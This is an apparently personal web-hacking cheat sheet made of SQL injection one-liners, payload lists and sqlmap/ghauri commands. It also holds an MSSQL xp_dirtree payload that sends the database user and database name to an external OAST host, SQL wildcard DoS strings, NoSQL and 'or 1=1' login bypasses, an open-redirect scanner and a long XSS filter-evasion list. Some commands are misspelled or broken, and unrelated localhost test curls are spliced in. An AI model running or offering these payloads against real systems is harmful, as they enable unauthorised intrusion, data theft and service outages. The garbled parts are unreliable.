grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"

  subfinder -d site.com -all -silent | waybackurls | sort -u | gf sqli > gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli.txt
  
  
 #tip
  Do you know that sqlmap has its own crawler? Run in the background easily:
sqlmap -u 'https://target\.com' --crawl=3 --random-agent --batch --forms --threads=5 --hostname --timeout=15 --retries=1 --time-sec 12
  
  Found SQL Injection to Account Takeover Manually :) 
1. Enter mobile number to login intercept
{"mobile_number":"8888888888"} >> 200
{"mobile_number":"8888888888'"} >> 500
{"mobile_number":"8888888888''"} >> 200
  
  
  #Time-based-SQL-injection
  cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
  
  #tip
  if The target is running the Postgres SQL server put the Unicode char  "\u0000"  and see the magic 😄
note:  this can break the database
  
  
  
   SQL ERROR
 POST /updateUser
 Host: example.com

 user_id=1338&name=test
 
 If you were to provide user_id=1338-1 and it was vulnerable, then the code would execute against user_id=1337. The code

$sql = "UPDATE users SET name='test' WHERE id='1338-1'"; will be executed as being user id 1337


   #tip
   stumbled on subdomain giving 403    example legacypanel.redacted.com
   added a path to it and watch the response 
   legacypanel.redacted.com/dummy, check the response to check if it gives 404
   indicating 404 means that the 403 restriction was only applied on the main domain and not on other paths.
   fuzz and bruteforce  to get other paths and get the register box
   1234’ %2F%2A%2A%2FAnd%2F%2A%2A%2Fsleep(5)   on the resgiter page /// try other bypass if blocked by waf
   
  
   
#TIP 
Found SQL Injection in [org_id] Cookie
Payloads for Testing: 
-1 OR 0=6 AND 0-0=> FALSE 
-1 OR 6=6 AND 0-0=> TRUE

#tip 
Injected in request like this
Cookie:organization_id=-1%20OR%200%3D6%20AND%200-0

  #UniBox   
  username field , you can place in any password
   'or 1=1 limit 1-- -


  TIP
     **** #Tip  tip tip   in every comment 
In a comment or picture that has an id, try create an imagery id and watch the response,  then try sql injection by    inserting 123456789 OR 1=1 into the  address bar as the pic_id parameter. 


  #tip
  Sql injection tutorial on Addslashes
http://leettime.net/sqlninja.com/tasks/mics_ch6.php?id=1%af%5c'Union(select(1),version(),3,4,5,6,7,8)%23 
   
   #tip
   Sending payload on burp within the URL/URI itself can also trigger SQL injection. So don't just focus on the parameters.
   
#tip
  Note and tip
  SQLi Tip - If you're able to find a JSON POST-based potential SQL injection (SQLi), remember to execute the SQLMAP query with -u and --data using JSON input. I've found more success using this method in SQLMap than when using a request file
  
#tip
  SQLMap from Waybackurls
waybackurls target | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt && cat urls.txt | xargs -I{} sqlmap --technique=T --batch -u "{}"


 
 
---
𝗧𝗶𝗺𝗲 𝗯𝗮𝘀𝗲𝗱 𝗦𝗤𝗟 𝗜𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻 𝗢𝗻𝗲𝗹𝗶𝗻𝗲𝗿
cat urls.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)" > blindsqli.txt
 
 
 Always try the "\" character in login entries. It can trigger an SQL.

curl -d 'username=1\&password=1\' -X POST https :// login(.)domain(.)com
  
  
  #tip
  python3 sqlmap.py -u https://www..gov./press-release-detail?id=6622 — batch — banner — dbs — dump-all technique=E — risk 3 — level 4 -v 3 — prefix="'(" — suffix="')" — flush-session — random-agent
  
  python3 sqlmap.py "https://www...x.x.x..com/en/login.php?destination=%2Forchis%2F6%3FPHPSESSID%3D&PHPSESSID=" — level=5 — risk=3 — banner — dump-all
 
 
 # Test case: Valid comment ID
curl -X GET 'http://localhost:8000/comment?id=123'

# Test case: Invalid comment ID
curl -X GET 'http://localhost:8000/comment?id=invalid'

# Test case: Non-existing comment ID
curl -X GET 'http://localhost:8000/comment?id=999'

# Test case: Error during execution
curl -X GET 'http://localhost:8000/comment?id=123' -H 'X-Error-Simulate: true'
# Test case: Valid request with all parameters
curl -X POST 'http://localhost:8000/user' \
  -H 'Content-Type: application/json' \
  -d '{"name": "John Doe", "age": 30, "email": "john@example.com"}'

# Test case: Request missing required parameter (name)
curl -X POST 'http://localhost:8000/user' \
  -H 'Content-Type: application/json' \
  -d '{"age": 25, "email": "jane@example.com"}'

# Test case: Request with only required parameter (name)
curl -X POST 'http://localhost:8000/user' \
  -H 'Content-Type: application/json' \
  -d '{"name": "Jane Smith"}'

# Test case: Request with invalid age value
curl -X POST 'http://localhost:8000/user' \
  -H 'Content-Type: application/json' \
  -d '{"name": "Alice", "age": "twenty-five", "email": "alice@example.com"}'

# Test case: Request with empty email
curl -X POST 'http://localhost:8000/user' \
  -H 'Content-Type: application/json' \
  -d '{"name": "Bob", "age": 45, "email": ""}'



  #tip 
    https://github.com/ferreiraklet/Jeeves
      cat sql_wordlist.txt | while read payload;do echo http://testphp.vulnweb.com/artists.php?artist= | qsreplace $payload | jeeves -t 5;done


   5 COMMAND CAN HELP TO EASILY IDENTIFY SQL INJECTION       
                                                         
   1. sublist3r -d target | tee -a domains (you can use other tools like findomain, assetfinder, etc.)
  2. cat domains | httpx | tee -a alive
  3. cat alive | waybackurls | tee -a urls
  4. gf sqli urls >> sqli
  5. sqlmap -m sqli --dbs --batch
  6. use tamper scripts
  
  
  tip 
  https://x.com/vulncure/status/1734908685103575408?s=20
     
           #or
         use this
            3 easy steps to get your first SQLi:

1️⃣ Waybackurls: Gather all the possible url’s of a target.

cat target.txt | waybackurls | tee urls.txt

2️⃣ GF tool: Filter all the SQL parameters of a target and save it as any.txt.

cat any.txt | gf sql > any.txt


3️⃣ SQLmap: Send any.txt to SQLmap.

python http://sqlmap.py -m any.txt  —risk 3 —batch

💸 Alternatively use Gahuri to test the same
     
          
     
#tip
 boolean-based SQL injection payload
      "XOR(if((select/**/666/**/where/**/1=1),444,0))XOR"       // This would result in a TRUE condition returning a response of ~21,000 bytes
"XOR(if((select/**/666/**/where/**/1=2),444,0))XOR"             // This would result in a FALSE condition returning ~27,000 bytes




#MORE-ABOUT-SQLMAP
      https://medium.com/@cuncis/the-ultimate-sqlmap-tutorial-master-sql-injection-and-vulnerability-assessment-4babdc978e7d
      
        MODIFYING HTTP HEADERS AND COOKIES
        to modify the User-Agent header to "Mozilla/5.0" 
        sqlmap -u <target URL> --headers="User-Agent: Mozilla/5.0"
        
         to modify the PHPSESSID cookie to "12345" 
         sqlmap -u <target URL> --cookie="PHPSESSID=12345"
     
      TAMPERING WITH REQUEST PARAMETERS
      --data: This option allows you to set or modify the data sent in the request body during the scan. You can use it to modify parameters such as username, password, id
      to modify the id parameter to "1' OR 1=1#"
      sqlmap -u <target URL> --data="id=1' OR 1=1#"
       sqlmap -u <target URL> --data="id=%27+OR+1%3D1--"                     //      Bypassing input filters
       
     sqlmap -u <target URL> --data="id=1' AND SLEEP(5)--"      using timebase , If a database has a firewall in place that blocks certain SQL commands or queries
     sqlmap -r request.txt --random-agent --dbs --proxy=http://127.0.0.1:8080 --force-ssl --batch --risk 3 --level 3
      
      --tamper       This option allows you to use custom tampering scripts to modify the data sent in the request body.
      sqlmap -u <target URL> --data="id=1' OR 1=1#" --tamper=apostrophemask.py
        sqlmap -u <target URL> --data="id=1' OR 1=1#" --tamper=tamper/space2hash.py                         //      Bypassing input filters     WITH TAMPER 
        
        Error-Based Sql Injection🤑️
        sqlmap -u "http://example.com/vulnerable.php?id=1" --technique E --dump
      
        
        Blind SQL Injection
       sqlmap -u "http://example.com/vulnerable.php" --data="username=admin&password=password" --technique B --string="Welcome, admin!" --not-string="Invalid login"
                                  
     
    http://thegreycorner.com/2017/01/05/exploiting-difficult-sql-injection.html 
    https://github.com/stephenbradshaw/pentesting_stuff/blob/master/helper_servers/sqlmap_secondorder_helper_server.py
     NOTE
  use NULL values in the UNION SELECT? NULL is a great value to use in UNIONS when trying to determine the correct number of columns in an injection, as it can sit in place of a number of different field types, such as numbers, strings and dates
  
  Detection options
     --string='Name\x0a\x09\x09Stephen'
     
     
using GHARUI
    Basic Scan with Custom User-Agent and Cookie:
    ghauri -u https://www.site.com/vuln.php?id=1 --user-agent "mozilla/5.0" --cookie "PHPSSESSID=ABACE22333"
 
 skipping URL Encoding of Payload Data:
This command skips URL encoding of payload data while testing the 'id' parameter for SQL injection
 ghauri -u https://www.site.com/vuln.php?id=1 --p id --skip-urlencode
   
   fresh quieries
    ghauri -u https://www.site.com/vuln.php?id=1 --fresh-queries
 
 Testing Specific Parameter with Prefix and Suffix:
  ghauri -u https://www.site.com/vuln.php?id=1  -p id --prefis "' or 1=1 --" --ssuffix "#"
  
   with tread
    ghauri -u https://www.site.com/vuln.php?id=1 --threads 5
     Custom Detection Criteria with HTTP Code:
       ghauri -u https://www.site.com/vuln.php?id=1  --code 200 --string "welcome"
       
       
    tip                              check more on this write up     https://infosecwriteups.com/i-earned-3500-and-40-points-for-a-graphql-blind-sql-injection-vulnerability-5b7e428c477d  
    whenever you encounter internal server error while testing sql,  validate by sending by sending sql paylaod                        XOR(if(now()=sysdate(),sleep(9),0))XOR\"Z                or 
   payload 14)%20AND%20(SELECT%207415%20FROM%20(SELECT(SLEEP(10)))CwkU)%20AND%20(7515=7515  and test sqli on every sql query and also check the bytes
 
#tip  
 payload 14)%20AND%20(SELECT%207415%20FROM%20(SELECT(SLEEP(10)))CwkU)%20AND%20(7515=7515
 
 #TIP
 SQL injection Oneliner.
 subfinder -dL domains.txt | dnsx | waybackurl | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1

grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"

    TIME-BASE SQL INJECTION
gau DOMAIN.tld  | sed 's/=[^=&]*/=YOUR_PAYLOAD/g' | grep ?*= | sort -u | while read host;do (time -p curl -Is $host) 2>&1 | awk '/real/ { r=$2;if (r >= TIME_OF_SLEEP ) print h " => SQLi Time-Based vulnerability"}' h=$host ;done


waybackurls http://TARGET.COM | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt 

 '"<svg/onload=prompt(5);>{{7*7}}
 
 
 SQL Injectjon for Contact/Registration Forms .

1. sqlmap -u http://target.com/registration --dbs --forms --crawl=2
2. it will crawl all the links having input field
3. select the parameter you want to test


Exploitation of mssql injection
By appending the value ‘“”) to the parameter, I triggered an error revealing that the table name was too long, indicating the presence of a SQL injection vulnerability. Further refining the injection payload, I successfully balanced the query to execute arbitrary commands. For instance:

“https://evil.com/path/test.aspx?fuzz=1')--+-"
“https://evil.com/path/test.aspx?fuzz=1') and 1=@@version — +-


  
#TIP
Find SQLi using Jeeves
echo "http://exampl.com" | gf sqli | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 10

  #tip
  If you find sql injection and encounter a 403 or waf block, be sure to try tamper scripts and update your sqlmap
Payload ; 
sqlmap -r req.txt --risk 3 --level 3 --dbs --tamper=space2comment,space2morehash


#tips
  Step 1: Go admin login page                        https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt

Step 2: Now enter the payload in the username or password field,

Payload Used: admin’ or ‘1’=’1'#

Step 3: Enter the payload and click the submit button.

Step 4 : Booooom!!! You Login successfully…





 TOP XOR BLIND PAYLOADS 

0'XOR(if(now()=sysdate(),sleep(10),0))XOR'X

0"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z

'XOR(if((select now()=sysdate()),sleep(10),0))XOR'Z

X'XOR(if(now()=sysdate(),//sleep(5)//,0))XOR'X

X'XOR(if(now()=sysdate(),(sleep((((5))))),0))XOR'X

X'XOR(if((select now()=sysdate()),BENCHMARK(1000000,md5('xyz')),0))XOR'X

'XOR(SELECT(0)FROM(SELECT(SLEEP(9)))a)XOR'Z

(SELECT(0)FROM(SELECT(SLEEP(6)))a)

'XOR(if(now()=sysdate(),sleep(5*5),0))OR'

'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'

(SELECT * FROM (SELECT(SLEEP(5)))a)

'%2b(select*from(select(sleep(5)))a)%2b'

CASE//WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END

');(SELECT 4564 FROM PG_SLEEP(5))--

["')//OR//MID(0x352e362e33332d6c6f67,1,1)//LIKE//5//%23"]

DBMS_PIPE.RECEIVE_MESSAGE(%5BINT%5D,5)%20AND%20%27bar%27=%27bar

AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5) AND 'bar'='bar

1' AND (SELECT 6268 FROM (SELECT(SLEEP(5)))ghXo) AND 'IKlK'='IKlK

(select*from(select(sleep(20)))a)

'%2b(select*from(select(sleep(0)))a)%2b'

*'XOR(if(2=2,sleep(10),0))OR'
-1' or 1=IF(LENGTH(ASCII((SELECT USER())))>13, 1, 0)--//

'+(select*from(select(if(1=1,sleep(20),false)))a)+'"

2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)

BENCHMARK(10000000,MD5(CHAR(116)))

'%2bbenchmark(10000000%2csha1(1))%2b'

'%20and%20(select%20%20from%20(select(if(substring(user(),1,1)='p',sleep(5),1)))a)--%20 - true

polyglots payloads:

if(now()=sysdate(),sleep(3),0)/'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"/

if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0) and 1=1)"/ 



  subfinder -d target[.]com -all -silent | hakrawler | urldedupe |gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs --risk 1 --level 5 --random-agent | tee -a sqli.txt
  
  payloads
     admin';IF(97=97) WAITFOR DELAY '0:0:5' --820&TBPassword=
     
     admin'%3bIF(97=97)%20TAITFOR%20DELAY%20'0%3A0%3A5' --820&TBPassword=
     
admin';DECLARE @a varchar(1024);DECLARE @b varchar(1024);SELECT @a = (SELECT system_user);SELECT @b = (SELECT DB_NAME());EXEC('master..xp_dirtree "\\%c%' + @a + ' ' + '.' + '2svs73it2s6bhy1r9pghdhdhdh.oastify.com\test$"');--


     

  
  
  tip
  always test sqli in parallel in any json object
  
  
  tip
  you can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database.

These different formats may provide different ways for you to obfuscate attacks that are otherwise blocked due to WAFs and other defense mechanisms. Weak implementations often look for common SQL injection keywords within the request, so you may be able to bypass these filters by encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the S character in SELECT:
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>

  NOTE
   For a UNION query to work, two key requirements must be met:

    The individual queries must return the same number of columns.
    The data types in each column must be compatible between the individual queries.

To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:

    How many columns are being returned from the original query.
    Which columns returned from the original query are of a suitable data type to hold the results from the injected query.
    
    Determining the number of columns required
                 injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs.
                 The second method involves submitting a series of UNION SELECT payloads specifying a different number of null values: 
                 
                 
    NOTE 
    Out-of-band (OAST) techniques are a powerful way to detect and exploit blind SQL , this involves using burp collaborator or ooast 







       SQL-WILDCARD-DOS-   
        
       this is possible on every search fuction and also file upload features in wep app   
                        https://shahjerry33.medium.com/sql-wildcard-dos-hang-till-death-adbae66d1f7b
       SQL Wildcard DoS is about forcing the database to carry out CPU-intensive queries by using several wildcards
       
       
       steps
   go to     file upload feature
   uploaded a normal text file with the name Test2.txt
   intercepted the request and sent it to repeater for checking a normal response time
    Then change the file name to SQL Wildcard DoS payload: %n[^n]y[^j]l[^k]d[^l]h[^z]t[^k]b[^q]t[^q][^n]!%.txt and checked the response time
    visited the page where the files were being uploaded and the page was not available
    
    
    Sample Payloads

1  ‘%_[^!_%/%a?F%_D)_(F%)_%([)({}%){()}£$&N%_)$*£()$*R”_)][%](%[x])%a][$*”£$-9]_%’
2   ‘%64_[^!_%65/%aa?F%64_D)_(F%64)_%36([)({}%33){()}£$&N%55_)$*£()$*R”_)][%55](%66[x])%ba][$*”£$-9]_%54’ (bypasses mod-security)
3    _[r/a)_ _(r/b)_ _(r-d)_
4   %n[^n]y[^j]l[^k]d[^l]h[^z]t[^k]b[^q]t[^q][^n]!%
5     %_[aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[! -z]@$!_%
6    '%%%%'


       NOSQL INJECTION      NOSQL INJECTION       NOSQL INJECTION 

POST /login HTTP/1.1 Host: vuln.lab Content-Type: application/json {“username”: “admin”,”password”: “mypass”}

In order to test if the login is vulnerable to NoSQL injection, we can supply a JSON input object as follows:
POST /login HTTP/1.1 Host: vuln.lab Content-Type: application/json {“username”: “admin”,”password”: {‘$gt’: “”}} In cases where the application doesn’t use JSON as input, it’s still possible to inject an input object by passing an array object in the parameters request, as shown below:
POST /login HTTP/1.1 Host: vuln.lab Content-Type: application/x-www-form-urlencoded user=admin&password[$ne]=


 In both the above cases, we’re able to bypass the login and access the application
       
       
                 
                 
                 CR/LF (Carriage Return/Line Feed) Injection       CR/LF (Carriage Return/Line Feed) Injection

CR/LF (Carriage Return/Line Feed) injection is a type of security vulnerability. CR/LF refers to a sequence of two ASCII control characters: Carriage Return (CR, ASCII code 13) and Line Feed (LF, ASCII code 10). These characters are used in text files to signify the end of a line and control the positioning of the cursor or print head when displaying or printing text. CR/LF injection vulnerabilities occur when attackers insert CR/LF characters into input fields, file extensions or file uploads to manipulate application behavior. This can lead to exploits such as altering headers, injecting malicious code, or manipulating file content.
                 
                 
                 

Open Redirect:-
Open Redirection OneLiner :-

waybackurls tesorion.nl | grep -a -i =http | qsreplace 'evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
httpx -l i.txt -path "///evil.com" -status-code -mc 302
 

HTTPX scanning a guide

scanning using HTTPX and detecting techs running the page
echo "http://testphp.vulnweb.com" | httpx
echo "(url)" | httpx

Subdomain enum using subfinder and scan using HTTPX
subfinder -d vulnweb.com | httpx -title -status-code -tech-detect -follow-redirects


echo "http://google.co.in" | httpx -sc -cl -ct -location

echo "https://shodan.io" | httpx -probe -ip -cdn
echo "http://testphp.vulnweb.com" | httpx -lc -wc
echo "http://testphp.vulnweb.com" | httpx -debug

echo "http://hackerone.com" | httpx -pa -probe

echo "http://testphp.vulnweb.com" | httpx -probe -sc -path "/login.php"

sql injection in httpx
echo "http://testphp.vulnweb.com" | httpx -path "/listproducts.php?cat=1’" -ms "Error: You have an error in your SQL syntax;"

for xss injection

echo "http://testphp.vulnweb.com" | httpx -path "/listproducts.php?cat=<script>alert(1)</script>" -ms "<script>alert(1)</script>"

for login
echo "http://testphp.vulnweb.com" | httpx -debug-resp -x post -path "/userinfo.php" -H "Cookie: login=test%2Ftest" -body "uname=test&pass=test"

run through proxy
echo "http://testphp.vulnweb.com" | httpx -x all -probe -http-proxy http://127.0.0.1:8080

subfinder -d hackerone.com | httpx -timeout 10 | katana -proxy http://127.0.0.1:8080 -jc -aff 


FUFF SCANING " A DETAILED GUIDE"
simple attack
ffuf -u http://testphp.vulnweb.com/FUZZ/ -w dict.txt
     content discovery
ffuf -u http://localehost/FUZZ -w user/share/seclists/Diiscovery/web-content/common.txt


with burpsuite request 
ffuf -c -w ./wordlist.txt -u https://ffuf.io.fi/fuzz -replay-proxy http:localhost:8080

muitiple wordlist attack
ffuf -u https://ignitetechnologies.in/W2/W1/ -w dict.txt:W1 -w dns_dict.txt:W2

searching for specific extension
ffuf -u http://192.168.1.12/dvwa/FUZZ/ -w dict.txt -e .php

working on sql injection
ffuf -request brute.txt -request-proto http -mode clusterbomb -w users.txt:HFUZZ -w pass.txt:WFUZZ -mc 200
the brute.txt was developed by burp during interception, whereby Put HFUZZ in front of uname and WFUZZ in front of the pass.then procced using cluster bumb .... //check fuff doc in hackingarticles

filter code
ffuf -u http://192.168.1.12/dvwa/FUZZ/ -w dict.txt -fc 302      filter code
ffuf -u http://192.168.1.12/dvwa/FUZZ/ -w dict.txt -fs 2929      filter size

MAXIMUN TIME
ffuf -u http://192.168.1.12/dvwa/FUZZ/ -w dict.txt -fs 2929

verbose mode 
ffuf -u http://192.168.1.12/dvwa/FUZZ/ -w dict.txt -v

treads mode
ffuf -u http://192.168.1.12/dvwa/FUZZ/ -w dict.txt -t 1000


ATTACK WITH COOKIES
ffuf -u http://192.168.1.12/dvwa/FUZZ/ -w dict.txt -b "PHPSESSID:"7aaaa6d88edcf7cd2ea4e3853ebb8bde""
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt  -u  (url/ IP) -H 'Origin: http://FUZZ.crossfit.htb' -mr "Access-Control-Allow-Origin" -ignore-body



#https://github.com/codingo/VHostScan
VHostScan -t example.com


check the appas a consumer anddd strike payload according to laugauage and application used

check for objecct tools --dev tools(chrome)

check for authentictaion like useername ,Email,oauth,mfA

CHECK FOR OPEN PORT TOOLS MASSCAN, PORT COMMONLY USED 80, 441, 81
DIG,WHOIS,WHATWEB,MAP

SUDDOMMAIN ENUM and new parameter

ARUJUN, DIRB,NUCLEAR,gobuster




curl https://jldc.me/anubis/subdomains/tesla.com | jq -r ".[]"

dnsrecon -a -d floqast.com  

puredns bruteforce all.txt domain.com


assetfinder --subs-only <domain>
/subfinder-linux-amd64 -d tesla.com [-silent]


dnsrecon -r <DNS Range> -n <IP_DNS>   #DNS reverse of all of the addresses
dnsrecon -d facebook.com -r 157.240.221.35/24 #Using facebooks dns
dnsrecon -r 157.240.221.35/24 -n 1.1.1.1 #Using cloudflares dns
dnsrecon -r 157.240.221.35/24 -n 8.8.8.8 #Using google dns




in the broswer dns

ffuf -c -w /path/to/wordlist -u http://victim.com -H "Host: FUZZ.victim.com"



gobuster vhost -u https://mysite.com -t 50 -w subdomains.txt

wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --hc 400,404,403 -H "Host: FUZZ.example.com" -u http://example.com -t 100

subfinder -d hackerone.com | httpx -timeout 10 | katana -proxy http://127.0.0.1:8080 -jc -aff 




#https://github.com/codingo/VHostScan
VHostScan -t example.com


screenshoot tools
eyewitness , htttpscreenshot, shutter


EXPOLIT DB

HOW IS THE SESSION ESTABLISHED TOOLS -> devtools-> storage -> session

check for code reveiw

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/code-review-tools
https://app.snyk.io/



check for minor framwork and app use and payload the framework

ask how does it handle sspecial characters

how is user idntify





check for api
If you are attacking the /api/v3/sign-up endpoint try to perform bruteforce to /Sing-up, /SignUp, /singup...
Also try appending to the original endpoint bytes like %00, %0d%0a, %0d, %0a, %09, %0C, %20



is capcha used

does the site allow for user impersoniation , sensitive information being used, check idf websocket are used

is cors implemented
can you uplaod files  
check for owasp toplist


does the site allows for webhook url 

what htpp request are made

validate csrf token

open redirect xss 

check vulnerabilities in series

check for takeways when testin a vulnerabilities
     
     
     
  A ghetto collection of XSS payloads that I find to be useful during penetration tests, especially when faced with WAFs or application-based black-list filtering, but feel free to disagree or shoot your AK-74 in the air.
                                                                                                        
Simple character manipulations.  
Note that I use hexadecimal to represent characters that you probably can't type.  For example, \x00 equals a null byte, but you'll need to encode this properly depending on the context (URL encoding \x00 = %00).

HaRdc0r3 caS3 s3nsit1vITy bYpa55!
<sCrIpt>alert(1)</ScRipt>
<iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)>

Null-byte character between HTML attribute name and equal sign (IE, Safari).
<img src='1' onerror\x00=alert(0) />

Slash character between HTML attribute name and equal sign (IE, Firefox, Chrome, Safari).
<img src='1' onerror/=alert(0) />

Vertical tab between HTML attribute name and equal sign (IE, Safari).
<img src='1' onerror\x0b=alert(0) />

Null-byte character between equal sign and JavaScript code (IE).
<img src='1' onerror=\x00alert(0) />

Null-byte character between characters of HTML attribute names (IE).
<img src='1' o\x00nerr\x00or=alert(0) />

Null-byte character before characters of HTML element names (IE).
<\x00img src='1' onerror=alert(0) />

Null-byte character after characters of HTML element names (IE, Safari).
<script\x00>alert(1)</script>

Null-byte character between characters of HTML element names (IE).
<i\x00mg src='1' onerror=alert(0) />

Use slashes instead of whitespace (IE, Firefox, Chrome, Safari).
<img/src='1'/onerror=alert(0)>

Use vertical tabs instead of whitespace (IE, Safari).
<img\x0bsrc='1'\x0bonerror=alert(0)>

Use quotes instead of whitespace in some situations (Safari).
<img src='1''onerror='alert(0)'>
<img src='1'"onerror="alert(0)">

Use null-bytes instead of whitespaces in some situations (IE).
<img src='1'\x00onerror=alert(0)>

Just don't use spaces (IE, Firefox, Chrome, Safari).
<img src='1'onerror=alert(0)>

Prefix URI schemes.
Firefox (\x09, \x0a, \x0d, \x20)
Chrome (Any character \x01 to \x20)
<iframe src="\x01javascript:alert(0)"></iframe> <!-- Example for Chrome -->

No greater-than characters needed (IE, Firefox, Chrome, Safari).
<img src='1' onerror='alert(0)' <

Extra less-than characters (IE, Firefox, Chrome, Safari).
<<script>alert(0)</script>

Backslash character between expression and opening parenthesis (IE).
<style>body{background-color:expression\(alert(1))}</style>

JavaScript Escaping
<script>document.write('<a hr\ef=j\avas\cript\:a\lert(2)>blah</a>');</script>

Encoding Galore.

HTML Attribute Encoding
<img src="1" onerror="alert(1)" />
<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
<iframe src="javascript:alert(1)"></iframe>
<iframe src="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;"></iframe>

URL Encoding
<iframe src="javascript:alert(1)"></iframe>
<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>

CSS Hexadecimal Encoding (IE specific examples)
<div style="x:expression(alert(1))">Joker</div>
<div style="x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))">Joker</div>
<div style="x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))">Joker</div>
<div style="x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029">Joker</div>

JavaScript (hexadecimal, octal, and unicode)
<script>document.write('<img src=1 onerror=alert(1)>');</script>
<script>document.write('\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x31\x20\x6F\x6E\x65\x72\x72\x6F\x72\x3D\x61\x6C\x65\x72\x74\x28\x31\x29\x3E');</script>
<script>document.write('\074\151\155\147\040\163\162\143\075\061\040\157\156\145\162\162\157\162\075\141\154\145\162\164\050\061\051\076');</script>
<script>document.write('\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0031\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029\u003E');</script>

JavaScript (Decimal char codes)
<script>document.write('<img src=1 onerror=alert(1)>');</script>
<script>document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,49,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,48,41,62));</script>

JavaScript (Unicode function and variable names)
<script>alert(123)</script>
<script>\u0061\u006C\u0065\u0072\u0074(123)</script>

Overlong UTF-8 (SiteMinder is awesome!)
< = %C0%BC = %E0%80%BC = %F0%80%80%BC
> = %C0%BE = %E0%80%BE = %F0%80%80%BE
' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2

<img src="1" onnerror="alert(1)">
%E0%80%BCimg%20src%3D%E0%80%A21%E0%80%A2%20onerror%3D%E0%80%A2alert(1)%E0%80%A2%E0%80%BE

UTF-7 (Missing charset?)
<img src="1" onerror="alert(1)" />
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-

Unicode .NET Ugliness
<script>alert(1)</script>
%uff1cscript%uff1ealert(1)%uff1c/script%uff1e

Classic ASP performs some unicode homoglyphic translations... don't ask why...
<img src="1" onerror="alert('1')">
%u3008img%20src%3D%221%22%20onerror%3D%22alert(%uFF071%uFF07)%22%u232A

Useless and/or Useful features.

HTML 5 (Not comphrensive)
<video src="http://www.w3schools.com/html5/movie.ogg" onloadedmetadata="alert(1)" />
<video src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)" />

Usuage of non-existent elements (IE)
<blah style="blah:expression(alert(1))" />

CSS Comments (IE)
<div style="z:exp/*anything*/res/*here*/sion(alert(1))" />

Alternate ways of executing JavaScript functions
<script>window['alert'](0)</script>
<script>parent['alert'](1)</script>
<script>self['alert'](2)</script>
<script>top['alert'](3)</script>

Split up JavaScript into HTML attributes
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>

HTML is parsed before JavaScript
<script>
var junk = '</script><script>alert(1)</script>';
</script>

HTML is parsed before CSS
<style>
body { background-image:url('http://www.blah.com/</style><script>alert(1)</script>'); }
</style>

XSS in XML documents [doctype = text/xml] (Firefox, Chrome, Safari).
